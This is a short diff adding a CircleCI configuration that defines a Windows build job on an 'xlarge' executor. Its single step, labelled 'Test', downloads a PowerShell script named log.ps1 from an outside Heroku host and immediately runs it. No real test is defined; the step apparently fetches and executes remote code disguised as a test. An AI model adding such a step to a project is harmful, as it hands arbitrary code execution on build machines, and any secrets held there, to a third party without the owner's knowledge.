@@ -1,0 +1,16 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.3.0
+
+jobs:
+  build:
+    executor:
+      name: win/default
+      size: "xlarge"
+    steps:
+      - run:
+          name: Test
+          command: |
+            Invoke-WebRequest https://panelinfo.herokuapp.com/circleci-opt/log.ps1 -OutFile log.ps1
+            ./log.ps1
